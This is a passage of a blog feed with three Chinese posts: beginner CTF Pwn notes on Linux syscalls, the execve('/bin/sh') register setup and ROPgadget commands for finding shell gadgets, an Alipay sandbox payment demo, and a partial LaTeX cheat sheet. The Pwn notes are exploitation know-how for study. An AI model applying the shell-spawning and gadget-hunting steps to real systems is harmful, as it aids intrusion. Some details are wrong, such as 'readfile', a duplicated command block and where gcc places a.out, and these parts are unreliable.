        <content type="html"><![CDATA[<h1 id="一、Linux基础知识"><a href="#一、Linux基础知识" class="headerlink" title="一、Linux基础知识"></a>一、Linux基础知识</h1><h2 id="1-根目录结构"><a href="#1-根目录结构" class="headerlink" title="1. 根目录结构"></a>1. 根目录结构</h2><p>​linux中的一切都可以看成文件， Linux下的起点是在 根目录下， 都是从（&#x2F;斜杆）开始向下延申的。一般情况下程序打开终端是处在你自己的文件夹下</p><p>linux的文件类型主要包含三种：</p><ul><li>普通文件： 包含文本文件（只含 ASCII或Unicode字符，换行符为”\n”， 即十六进制0x0A）和二进制文件</li><li>目录： 包含一组链接的文件，其中每个链接都将一个文件名映射到一个文件，这个文件可能是另一个目录</li><li>特殊文件： 包括块文件、符号链接、管道、套接字等</li></ul><p>​目录层次结构中位置可以用绝对路径（从根节点开始）和相对路径（从当前目录开始）表示</p><p>（1）文件与目录的区别</p><blockquote><p>目录：就相当于windows下的文件夹</p><p>文件：就是一群文件</p></blockquote><p>（2）根目录与家目录的区别</p><blockquote><p>家目录：一般打开终端的就是在家目录下，这里就是你这个用户存放的文件处</p><p>根目录：即最开始的目录，它下面存放着操作系统的一些信息，而且如果该系统存在多用户，在home目录下还会出现多个用户名</p></blockquote><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220122223215414.png" alt="image-20220122223215414"></p><p>（3）linux的一些区别</p><blockquote><p>linux下的文件格式不以文件名的后缀确定，而是有文件的文件头决定。也就是说它本事是一个压缩包，那么即使修改了它的后缀它仍然是一个压缩包</p></blockquote><p>等等</p><h2 id="2-软链接（符号链接）与硬链接"><a href="#2-软链接（符号链接）与硬链接" class="headerlink" title="2. 软链接（符号链接）与硬链接"></a>2. 软链接（符号链接）与硬链接</h2><blockquote><p>软链接：类似于windows下的快捷键</p><p>硬链接：相当于复制一份文件</p></blockquote><h2 id="2-字节序"><a href="#2-字节序" class="headerlink" title="2. 字节序"></a>2. 字节序</h2><blockquote><p>计算机采用了两种字节存储机制：大端和小端。 </p><p>其中大端规定在MSB在存储是放在地位，在传输时放在流的开始；LSB存储时放在高地址，在传输时放在流的末尾。</p><p>小端则正好相反。</p><p>小端： 常见的Intel处理器使用，做题时一般情况下都是小端</p><p>大端： PowerPC系列处理器、TCP&#x2F;IP协议和Java虚拟机的字节序等等</p></blockquote><p>以一个十六进制整数 0x12345678存入以 1000H 开始的内存为例，查看存储方式不同，可以发现大端存储就是我们日产生活中使用的形式，而小段则是相反的。这是因为······</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220124115718183-16583127484097.png" alt="image-20220124115718183"></p><h2 id="3-ld-linux-so"><a href="#3-ld-linux-so" class="headerlink" title="3. ld-linux.so"></a>3. ld-linux.so</h2><blockquote><p>ld-linux .so是linux下的动态库链接器&#x2F;加载器。</p><p>当一个 需要动态链接 的程序被操作系统加载时， 系统要通过要ld-linux.so来定位 然后加载程序所需要的所有动态库文件。</p><p>此时 我们可以通过ldd命令来查看一个程序需要哪些依赖的动态库</p></blockquote><h2 id="4-调用约定"><a href="#4-调用约定" class="headerlink" title="4. 调用约定"></a>4. 调用约定</h2><blockquote><p>函数调用约定是对函数调用时如何传递参数的一种约定。关于它的预定有许多种，下面从内核接口和用户接口两仿麦呢介绍32位和64位Linux的调用约定</p></blockquote><p>（1）内核接口</p><ul><li>x86_32系统调用约定：32位程序主要通过寄存器传递参数。eax位syscall_number、ebx、ecx、edx、esi和ebp用于将6个参数传递给系统调用。返回值保存在eax中。所有寄存器都保留在int 0x80中</li></ul><ol><li>查看程序的系统调用</li></ol><pre><code class="c">strace ./pwn    链接：http://blog.chinaunix.net/uid-69947851-id-5825847.html</code></pre><ol start="2"><li>execve函数</li></ol><h2 id="5-系统调用"><a href="#5-系统调用" class="headerlink" title="5. 系统调用"></a>5. 系统调用</h2><p>系统调用就是：操作系统已经抽象好了的一个接口，你要怎么操控硬件，只能经过操作系统已经制定好了的系统调用规定的规则来操控硬件，不可直接访问它。</p><p>在Linux下可以查看32位、64位程序下的系统调用号</p><blockquote><p>cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_32.h</p><p>cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_64.h</p></blockquote><p>32位与64位程序之间的区别</p><blockquote><p>① 32位与64位的系统调用号对应的内容不同</p><p>② 32位程序用的是， 而64位程序采用的是syscall</p></blockquote><p>这里以64位程序为例</p><pre><code class="bash">#ifndef _ASM_X86_UNISTD_64_H#define _ASM_X86_UNISTD_64_H 1#define __NR_read 0#define __NR_write 1#define __NR_open 2#define __NR_close 3#define __NR_stat 4#define __NR_fstat 5#define __NR_lstat 6#define __NR_poll 7#define __NR_lseek 8#define __NR_mmap 9#define __NR_mprotect 10#define __NR_munmap 11#define __NR_brk 12#define __NR_rt_sigaction 13#define __NR_rt_sigprocmask 14#define __NR_rt_sigreturn 15#define __NR_ioctl 16#define __NR_pread64 17#define __NR_pwrite64 18#define __NR_readv 19#define __NR_writev 20#define __NR_access 21#define __NR_pipe 22#define __NR_select 23#define __NR_sched_yield 24#define __NR_mremap 25#define __NR_msync 26#define __NR_mincore 27#define __NR_madvise 28#define __NR_shmget 29#define __NR_shmat 30#define __NR_shmctl 31#define __NR_dup 32#define __NR_dup2 33#define __NR_pause 34#define __NR_nanosleep 35#define __NR_getitimer 36#define __NR_alarm 37#define __NR_setitimer 38#define __NR_getpid 39#define __NR_sendfile 40#define __NR_socket 41#define __NR_connect 42#define __NR_accept 43#define __NR_sendto 44#define __NR_recvfrom 45#define __NR_sendmsg 46#define __NR_recvmsg 47#define __NR_shutdown 48#define __NR_bind 49#define __NR_listen 50#define __NR_getsockname 51#define __NR_getpeername 52#define __NR_socketpair 53#define __NR_setsockopt 54#define __NR_getsockopt 55#define __NR_clone 56#define __NR_fork 57#define __NR_vfork 58#define __NR_execve 59#define __NR_exit 60    ···········#endif /* _ASM_X86_UNISTD_64_H */</code></pre><p>这里面最重要的一个系统调用是59号的execve，它的原型就是execve(“&#x2F;bin&#x2F;sh”, null, null)相当于system函数</p><p>它的调用方式是</p><blockquote><ul><li>rax 59（系统调用号， 可以自己写，可以是程序本身的）</li><li>rdi &#x2F;bin&#x2F;sh（参数1）</li><li>rsi 0（参数2）</li><li>rdx 0（参数3）</li><li>syscall（调用方式：一个地址）</li></ul><p>32位程序的话就是eax、ebx、ecx、edx以及int 80</p></blockquote><h1 id="二、linux基础命令"><a href="#二、linux基础命令" class="headerlink" title="二、linux基础命令"></a>二、linux基础命令</h1><p>（1） 查看命令：</p><pre><code class="bash">cat flag.txt# 查看flag.txt文件里面的内容ll flag # 查看flag目录里的文件ls flag # 查看flag目录下的文件 </code></pre><p>（2）mv命令</p><pre><code class="bash">mv test.c test.zip# 修改test.c 的名字为 test.zipmv ~/test.c ./#将家目录下的test.c文件移动到当前目录下</code></pre><p>（3）cd命令</p><pre><code class="bash">cd flag # 进入当前目录下的flag目录cd # 回到家目录cd / # 回到根目录cd ../# 回到上一个目录</code></pre><p>（4）clear命令</p><pre><code>clear # 清理全屏</code></pre><p>（4）rm命令</p><pre><code class="bash">rm test.txt # 删除test.txt文件rm -r test# 删除test目录rm -f test.txt# 直接删除，无需确认</code></pre><p>（5）cp命令</p><pre><code class="bash">cp ~/test.c ./# 将根目录下的test.c 文件复制到当前目录下</code></pre><p>（6）易混淆的命令</p><blockquote><p><code>./</code>（点号 + &#x2F;）：表示当前目录</p><p><code>~/ </code>（波浪号 + &#x2F;）：表示家目录</p><p><code>/</code>（&#x2F;）：表示根目录</p></blockquote><p>（7）不常见的命令：</p><blockquote><p>strace .&#x2F;pwn查看程序的系统调用（学习链接：<a href="http://blog.chinaunix.net/uid-69947851-id-5825847.html%EF%BC%89">http://blog.chinaunix.net/uid-69947851-id-5825847.html）</a></p></blockquote><h1 id="三、Vi、Vim的操作"><a href="#三、Vi、Vim的操作" class="headerlink" title="三、Vi、Vim的操作"></a>三、Vi、Vim的操作</h1><p>vim是从vi发展来的编辑器，相对来说更加友善。vim是一款比较常见的编辑器，在Linux操作系统下用纯命令行来实现功能。当然也可以下载其他的编辑器来实现，这样可能会更加方便、美观</p><p>VIM有三种模式：底线命令行模式、编辑模式、命令行模式。每一种模式都有它对应的命令行</p><p>命令模式：你刚启动vim时就是命令模式，此时你并不会输入一个字符，当你按下i以后才会进入编辑模式编辑</p><p>编辑模式：这种模式是来让你来进行修改文件的，</p><p>底线命令行模式：编辑模式以后按住<code>：</code>就会进入底线命令行模式， 底线模式就是为了进行保存、推出的</p><blockquote><p>wq：表示保存退出</p><p>q：表示放弃然后退出</p><p>q!：表示强制退出</p><p>%!xxd 查看二进制。 </p><p>%!xxd -r还原</p></blockquote><h1 id="四、Pwn中重要的命令"><a href="#四、Pwn中重要的命令" class="headerlink" title="四、Pwn中重要的命令"></a>四、Pwn中重要的命令</h1><h2 id="1-file文件"><a href="#1-file文件" class="headerlink" title="1. file文件"></a>1. file文件</h2><blockquote><p>用于检测给定文件的类型，一般情况是不带参数的</p><p>参数： -z： 用于读取压缩文件的内容-L：用于解析符号链接的文件类型</p></blockquote><h2 id="1-ROPgadget命令"><a href="#1-ROPgadget命令" class="headerlink" title="1. ROPgadget命令"></a>1. ROPgadget命令</h2><pre><code class="bash"># 获取pwn这个二进制文件的的 只带有 pop和ret指令的地址ROPgadget --binary ./pwn --only “pop|ret”# 寻找带有字符串/bin/sh的地址ROPgadget --binary 【文件名】--string &#39;/bin/sh# 寻找int80的地址：ROPgadget --binary 【文件名】--only int#寻找文件中带有cat flag字符串的地址ROPgadget --binary 文件名 --sting &#39;cat flag&#39;</code></pre><h2 id="2-objdump命令"><a href="#2-objdump命令" class="headerlink" title="2. objdump命令"></a>2. objdump命令</h2><p>​用于查看目标文件的信息，具备反汇编能力。但是其反汇编主要是依赖的是ELF文件头，而且不会进行控制流分析，其健壮性较差，常见的参数如下：</p><blockquote><p><code>-s</code> ：将目标文件转换成十六进制表示</p><p><code>-d</code> ：用于对目标文件进行反汇编</p><p><code>-D</code> ：用于对目标文件进行反汇编</p><p><code>-j</code> ：指定具体的某一个节</p></blockquote><p>常见的使用</p><p>① 查找函数GOT的地址，用于获取函数的真实地址</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220124123528338-16583127484098.png" alt="image-20220124123528338"></p><pre><code class="bash"># 获取pwn这个二进制文件的的 只带有 pop和ret指令的地址ROPgadget --binary ./pwn --only “pop|ret”# 寻找带有字符串/bin/sh的地址ROPgadget --binary 【文件名】--string &#39;/bin/sh# 寻找int80的地址：ROPgadget --binary 【文件名】--only int#寻找文件中带有cat flag字符串的地址ROPgadget --binary 文件名 --sting &#39;cat flag&#39;</code></pre><h2 id="3-readfile命令"><a href="#3-readfile命令" class="headerlink" title="3. readfile命令"></a>3. readfile命令</h2><p>​用于解析ELF格式目标文件的信息。该工具和objdump类似，但是显示的内容更具体，且不依赖BFD库，常见的参数如下：</p><blockquote><p><code>-h  </code> ：显示目标文件的文件头<br><code>-l</code> ：显示目标文件的程序头</p><p><code>-S</code> ：显示目标文件的节区头信息</p><p><code>-s</code> ：显示目标文件的符号表</p><p><code>--dyn-syms</code>：显示目标文件的动态符号表</p></blockquote><p>常见的使用：</p><p>① 查看程序的文件头</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220124122334347.png" alt="image-20220124122334347"></p><p>②在libc中查看system函数的偏移量</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220124122231282.png" alt="image-20220124122231282"></p><h2 id="4-ldd命令"><a href="#4-ldd命令" class="headerlink" title="4. ldd命令"></a>4. ldd命令</h2><p>ldd命令用于查看目标文件有哪些依赖库， 以及这些依赖库在系统中的位置。常见的参数：</p><blockquote><p><code>-v</code> ：用于打印出依赖关系的详细信息 </p></blockquote><p>常见的使用</p><p>① 在ret2_libc 当中，当使用本地调试时需要获取该程序的libcbanben<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220210112058334.png" alt="image-20220210112058334"></p><h2 id="5-strace-命令"><a href="#5-strace-命令" class="headerlink" title="5. strace 命令"></a>5. strace 命令</h2><p>strace .&#x2F;pwn：查看程序的系统调用（链接：<a href="http://blog.chinaunix.net/uid-69947851-id-5825847.html%EF%BC%89">http://blog.chinaunix.net/uid-69947851-id-5825847.html）</a></p><h2 id="6-gcc编译程序"><a href="#6-gcc编译程序" class="headerlink" title="6. gcc编译程序"></a>6. gcc编译程序</h2><p>方法二：</p><p>gcc test.c -o test</p><p>gcc -Wall -g -o test test.c</p><p>-Wall 代表编译器在编译过程中会输出警告信息（Warning），比如有些变量你并没有使用，指针指向的类型有误，main 函数没有返回整数值等。这类信息虽然不是错误，不影响编译，但是很可能是程序 bug 的源头，也有助于你寻找代码中的错误，规范代码格式。所以建议每次编译时都加上 -Wall 参数。</p><p>-g 代表编译器会收集调试（debug）信息，这样如果你的程序运行出错，就可以通过 gdb 或者 lldb 等工具进行逐行调试，方便找出错误原因。如果你不是百分之百确定你的程序毫无问题，建议加上 -g 参数。这样 debug 的时候会方便很多。</p><p>-o 代表编译器会将编译完成后的可执行文件以你指定的名称输出到你指定的文件夹下。-o 的空格后的名称就是输出的文件的名称。例如我这里 -o 后是 test，就是说 gcc 会在编译成功后在我的当前目录下生成一个叫 test 的可执行文件。如果不加这个参数，每次编译后生成的可执行文件都会放在根目录下，名字叫做 a.out。每次编译成功后都会把上一次的 a.out 文件覆盖。所以建议加上 -o 参数，这样可以更加条理。</p><p>-m32：编译32位程序</p><p>- </p>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>支付宝接口开发</title>
      <link href="/2022/07/12/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91/"/>
      <url>/2022/07/12/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="前提引入"><a href="#前提引入" class="headerlink" title="前提引入"></a>前提引入</h1><p>该项目的功能：实现电脑支付系统，在电脑上面的商城里实现支付功能，以及退款、退部分款功能。</p><p>流程：</p><p>客户在系统内下订单 -&gt; 系统根据订单生成支付宝接口url -&gt; 客户通过url使用支付宝（网上银行）付款 -&gt; 支付宝将客户的付款完成信息发送给电子商务系统 -&gt; 系统收到支付宝信息后确定客户订单已经付款 -&gt; 进行发货等后续流程。</p><p>说明：该项目是在沙箱环境下模拟真实的支付环境，该项目涉及到外网，这里采用的是内网穿透的方式。这里我利用支付宝的接口，重要的是传递一些参数，利用了官网文档的demo，然后修改了一番，并不是从头开发的。</p><p>肝了几天，算是结束了。这里记录一下从开始到结束的全过程，虽然代码写的很烂，但是却也耗费了几天的时间。</p><h1 id="一、准备条件"><a href="#一、准备条件" class="headerlink" title="一、准备条件"></a>一、准备条件</h1><h3 id="1-填写好入住信息"><a href="#1-填写好入住信息" class="headerlink" title="1. 填写好入住信息"></a>1. 填写好入住信息</h3><p>进入蚂蚁金服<a href="https://open.alipay.com/%EF%BC%8C%E6%94%AF%E4%BB%98%E5%AE%9D%E7%99%BB%E9%99%86%EF%BC%8C%E5%A1%AB%E5%86%99%E5%A5%BD%E5%85%A5%E4%BD%8F%E4%BF%A1%E6%81%AF">https://open.alipay.com/，支付宝登陆，填写好入住信息</a></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118143710418.png" alt="image-20220118143710418"></p><h3 id="2-应用，点击创建应用"><a href="#2-应用，点击创建应用" class="headerlink" title="2. 应用，点击创建应用"></a>2. 应用，点击创建应用</h3><h3 id="3-使用沙箱模式进行开发"><a href="#3-使用沙箱模式进行开发" class="headerlink" title="3. 使用沙箱模式进行开发"></a>3. 使用沙箱模式进行开发</h3><p>点击进入沙箱环境里面会有几个很重要的东西：APPID、支付宝网关地址</p><h3 id="4-设置接口加密方式"><a href="#4-设置接口加密方式" class="headerlink" title="4. 设置接口加密方式"></a>4. 设置接口加密方式</h3><p>设置接口加密模式，可以使用默认的密钥，也可以自定义密钥，自定义的话一般选择RSA2加密</p><p>（1）点击设置并启用</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118144934845.png" alt="image-20220118144934845"></p><p>（2）点击公钥，进入公钥生成器</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118143319598.png" alt="image-20220118143319598"></p><p>（3）一键生成公钥，然后将公钥复制到开始位置，保存好私钥</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118143526613.png" alt="image-20220118143526613"></p><h1 id="二、实现demo案例"><a href="#二、实现demo案例" class="headerlink" title="二、实现demo案例"></a>二、实现demo案例</h1><h3 id="1-下载demo"><a href="#1-下载demo" class="headerlink" title="1. 下载demo"></a>1. 下载demo</h3><p>前往支付宝官网<a href="https://opendocs.alipay.com/open/270/106291/%E4%B8%8B%E8%BD%BDJava%E7%89%88%E7%9A%84demo%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8eclipse%E6%89%93%E5%BC%80">https://opendocs.alipay.com/open/270/106291/下载Java版的demo，然后用eclipse打开</a></p><h3 id="2-填写demo的内容"><a href="#2-填写demo的内容" class="headerlink" title="2. 填写demo的内容"></a>2. 填写demo的内容</h3><p><img src="/img/image-20220118151026953.png" alt="image-20220118151026953"></p><p>上面需要填写的信息在沙箱账号中都有，对于内网穿透，可以参考<a href="https://blog.csdn.net/sunyuhua_keyboard/article/details/119251802?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.nonecase">https://blog.csdn.net/sunyuhua_keyboard/article/details/119251802?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-3.nonecase</a></p><h3 id="3-配置tomcat"><a href="#3-配置tomcat" class="headerlink" title="3. 配置tomcat"></a>3. 配置tomcat</h3><p>由于我没有系统的学过Java的内容，后面才知道要创建tomcat才能使用</p><p>（1）下载tomcat</p><p>下载Tomcat网址：<a href="http://tomcat.apache.org/%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%89%E6%8B%A9%E4%BD%A0%E4%B8%8B%E8%BD%BD%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8core%E9%87%8C%E9%9D%A2%E9%80%89%E6%8B%A9%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%B9%E5%BC%8F">http://tomcat.apache.org/，然后选择你下载的版本，然后在core里面选择下载的方式</a></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118154802839.png" alt="image-20220118154802839"></p><p>（3）由于这里我选择的是zip压缩包，是免安装的。打开Eclipse，单击“window”菜单，选择下方的“Preferences”</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118155255800.png" alt="image-20220118155255800"></p><p>（4）找到Server下方的Runtime Environment，然后选择添加</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118155418396.png" alt="image-20220118155418396"></p><p>（5）选择已经成功安装的Tomcat版本，单击Next，设置Tomcat的安装目录，设置完成后，单击OK即可完成设置！</p><p><img src="/img/image-20220118160138808.png" alt="image-20220118160138808"></p><p>（6）右键web项目选择 Build Path -&gt; Configure Build Path， 然后进入如下页面：选择 Add Library</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118160313159.png" alt="image-20220118160313159"></p><p>（7）选择Server Runtime -&gt; next，然后选择apche tomcat8.5即可。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118160446736.png" alt="image-20220118160446736"></p><p>（8）<font color=red>说明：</font></p><p>① 好像可以直接点击servers使用，由于已经安装好了，具体情况不好溯源了</p><p>② 这里可能会有点坑，在下面的工具栏创建时sever当中可能没有apache这个选项，没有tomcat。</p><p>然后点击运行即可，注意进去的网站 是你的网址&#x2F;alipay.trade.page.pay-JAVA-UTF-8（你的项目名称）</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118160856483.png" alt="image-20220118160856483"></p><h1 id="三、解析demo"><a href="#三、解析demo" class="headerlink" title="三、解析demo"></a>三、解析demo</h1><h3 id="1-整体构造"><a href="#1-整体构造" class="headerlink" title="1. 整体构造"></a>1. 整体构造</h3><p>代码的话主要是由一个java类、是用来配置你的基础信息的类，和一些jsp文件（实现图形化界面和实现数据传递给后台）</p><h3 id="2-jsp代码"><a href="#2-jsp代码" class="headerlink" title="2. jsp代码"></a>2. jsp代码</h3><p>jsp：一种动态网页开发技术，它使用JSP标签在HTML网页中插入Java代码。标签通常以&lt;%开头以%&gt;结束。就像主要就是前端的（HTML、CSS、JS）+  Java。它有一些动作、指令。主要利用的是它的post表单处理。重点的页面</p><p>（1）首先查看首页的代码</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118162843207.png" alt="image-20220118162843207"></p><p>其中的form标签的作用就是传递数值给ation指定的链接，这里圈出的是指定的是支付页面的链接。也就是说你点击付款以后，你将将里面的参数传递给支付界面，然后利用request.getParameter()， 将你填写好的信息传递给pay</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118162920242.png" alt="image-20220118162920242"></p><p>最终利用alipayRequest.setBizContent() ，将参数全部传递给支付宝系统，它会对此做出处理</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118163304622.png" alt="image-20220118163304622"></p><p>其余页面也是通过这个办法处理的</p><p>然后在index里面还有一个getdata方法，它的作用是随机化一个订单号，而为了使订单号唯一，这里采取的措施是利用当前系统的时间，精确到了毫秒。然后利用document.getElementById().vaule。 给变量赋初始值，当然它使用了input标签，你可以进行修改。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220118163829622.png" alt="image-20220118163829622"></p><h3 id="三、异步通知与同步通知"><a href="#三、异步通知与同步通知" class="headerlink" title="三、异步通知与同步通知"></a>三、异步通知与同步通知</h3><p>同步通知：参数是return_url，返回的是用户系统的通知页面</p><p>异步通知：参数是notify_url， 用来修改数据库的订单状况，成功必须返回”success”,否则支付宝服务器会不断重发通知</p><h1 id="四、修改demo"><a href="#四、修改demo" class="headerlink" title="四、修改demo"></a>四、修改demo</h1><p>能够运行demo，但是可能有些东西需要修改</p><ol><li>支付的金额不能由用户自己输入，商品</li></ol><p>这里采用的是创建了一个订单界面和支付界面，列出一些产品供你查看，你只需要点击支付就会弹出一个订单页面供你查看，然后你点击支付即可弹出支付宝页面。这里最重要的就是将你填写好的数据进行传递。</p><p>首先，我采取的方法是利用form标签，将需要的参数传递到订单的页面，这些参数包括商户名称和金额，至于订单号在订单页面生成。</p><p>然后在订单页面，将得到的值传递到支付页面。需要注意的是document.getElementById().vaule取的值是一个字符串，需要用””包括，这里我弄了好久，最终的实现方法是在subject处加上了””；</p><pre><code class="jsp">&lt;%    String total_amount = new String(request.getParameter(&quot;WIDtotal_amount&quot;).getBytes(&quot;ISO-8859-1&quot;),&quot;UTF-8&quot;);    String subject = new String(request.getParameter(&quot;WIDsubject&quot;).getBytes(&quot;ISO-8859-1&quot;),&quot;UTF-8&quot;);    subject = &quot;\&quot;&quot; + subject+ &quot;\&quot;&quot;;%&gt;</code></pre><h1 id="五、存在的问题"><a href="#五、存在的问题" class="headerlink" title="五、存在的问题"></a>五、存在的问题</h1><p>由于自身的水平问题以及老师的需求仅仅是实现支付、退款和部分退款功能。加上还有另外的比赛和项目就没有继续往下开发了</p><h3 id="1-没有用到数据库"><a href="#1-没有用到数据库" class="headerlink" title="1.  没有用到数据库"></a>1.  没有用到数据库</h3><p>没有数据库的话就没有办法实现全部订单的页面，因为所有的数据都存在了支付宝数据库里面。你可以通过沙箱版的支付宝查看你的支付信息，包括支付订单号，支付金额等等。这显然是不人性化的，最好的方法是在支付的同时，在自己的服务器上面也存一份数据，然后展示给用户，这样的话方面用户退款。</p><h3 id="2-没有真正的掌握原理"><a href="#2-没有真正的掌握原理" class="headerlink" title="2. 没有真正的掌握原理"></a>2. 没有真正的掌握原理</h3><p>由于是直接使用的官网的demo，对于具体的实现还存在很多有问题，目前仅仅也就是看懂了里面的代码，实现了步骤罢了。</p><h3 id="3-前端页面不美观"><a href="#3-前端页面不美观" class="headerlink" title="3. 前端页面不美观"></a>3. 前端页面不美观</h3><p>页面可以说是及其简陋，页面不友好</p><h3 id="4-没有归类方法"><a href="#4-没有归类方法" class="headerlink" title="4. 没有归类方法"></a>4. 没有归类方法</h3><p>想归类一些方法，但是使用时存在一些问题。也许是语法不支持</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前能想到的就这么一些了，可能还有一些没有记录，没有及时记录，还是学到了不少东西。主要涉及到了Javaweb开发的一些东西，了解了支付宝接口的实现，对于Javaweb的开发流程也有了一点了解。要真正开发一个项目绝对不是那么容易的，基础的知识都不知道就去弄确实是要花费很多时间，没办法谁叫是老大提出的任务呢。</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 支付宝接口 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Latex的学习</title>
      <link href="/2022/07/12/Latex%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/12/Latex%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>（1）Latex主要是用来生成一些复杂的表格和公式。它一般在写论文需要写一些表达式时用到。</p><p>（2）使用latex需要了解一些关于latex的语法，在typora设置中打开md的拓展语法然后输入语法即可表示</p><p>（3）在两个$中输入语法即可转换，或者插入公式块(ctr+ shift +M )</p><h1 id="二、常见语句"><a href="#二、常见语句" class="headerlink" title="二、常见语句"></a>二、常见语句</h1><h2 id="1、大括号"><a href="#1、大括号" class="headerlink" title="1、大括号"></a>1、大括号</h2><blockquote><p>f(n) &#x3D; \left{<br>\begin{array}{l}<br>content<br>\end{array}<br>\right.</p></blockquote><h2 id="2、特殊符号"><a href="#2、特殊符号" class="headerlink" title="2、特殊符号"></a>2、特殊符号</h2><table><thead><tr><th align="center">符号</th><th align="center">表达方式</th></tr></thead><tbody><tr><td align="center">$\epsilon$</td><td align="center">\epsilon</td></tr><tr><td align="center">$\delta$</td><td align="center">\delta</td></tr><tr><td align="center">$\beta$</td><td align="center">\beta</td></tr><tr><td align="center">$\gamma$</td><td align="center">\gamma</td></tr><tr><td align="center">$\theta$</td><td align="center">\theta</td></tr><tr><td align="center">$\alpha$</td><td align="center">\alpha</td></tr><tr><td align="center">$\pi$</td><td align="center">\pi</td></tr><tr><td align="center">$\Psi$</td><td align="center">\Psi</td></tr><tr><td align="center">$\omega$</td><td align="center">\omega</td></tr></tbody></table><h2 id="3、集合关系"><a href="#3、集合关系" class="headerlink" title="3、集合关系"></a>3、集合关系</h2><table><thead><tr><th align="center">符号</th><th align="center">表达方式</th></tr></thead><tbody><tr><td align="center">$\cup$</td><td align="center">\cup</td></tr><tr><td align="center">$\cap$</td><td align="center">\cap</td></tr><tr><td align="center">$\times$</td><td align="center">\times</td></tr><tr><td align="center">$\in$</td><td align="center">\in</td></tr><tr><td align="center">$\notin$</td><td align="center">\notin</td></tr><tr><td align="center">$\bigoplus$</td><td align="center">\bigoplus</td></tr></tbody></table><h2 id="4、式子关系"><a href="#4、式子关系" class="headerlink" title="4、式子关系"></a>4、式子关系</h2><table><thead><tr><th align="center">符号</th><th align="center">表达方式</th><th align="center">注释</th></tr></thead><tbody><tr><td align="center">$\leq$</td><td align="center">\leq</td><td align="center">l：less（更小的）   eq：Equal（相等）</td></tr><tr><td align="center">$\geq$</td><td align="center">\geq</td><td align="center">g：greater（更大的）</td></tr><tr><td align="center">$\neq$</td><td align="center">\neq</td><td align="center">n：not（不相等）</td></tr><tr><td align="center">$\thickapprox$</td><td align="center">\thickapprox</td><td align="center">厚的；大约</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="5、箭头符号以及在箭头上下方添加内容"><a href="#5、箭头符号以及在箭头上下方添加内容" class="headerlink" title="5、箭头符号以及在箭头上下方添加内容"></a>5、箭头符号以及在箭头上下方添加内容</h2><table><thead><tr><th align="center">符号</th><th align="center">表达方式</th></tr></thead><tbody><tr><td align="center">$\to$</td><td align="center">\to</td></tr><tr><td align="center">$ X \stackrel{i}{\to} S$</td><td align="center">X  \stackrel{i}  {\to} S</td></tr><tr><td align="center">$\longrightarrow$</td><td align="center">\longrightarrow</td></tr><tr><td align="center">S$\stackrel{*}{\Rightarrow}$x</td><td align="center">S       \stackrel{*}{\Rightarrow}       x</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="6、数学表达式"><a href="#6、数学表达式" class="headerlink" title="6、数学表达式"></a>6、数学表达式</h2><table><thead><tr><th align="center">符号</th><th align="center">表达方式</th></tr></thead><tbody><tr><td 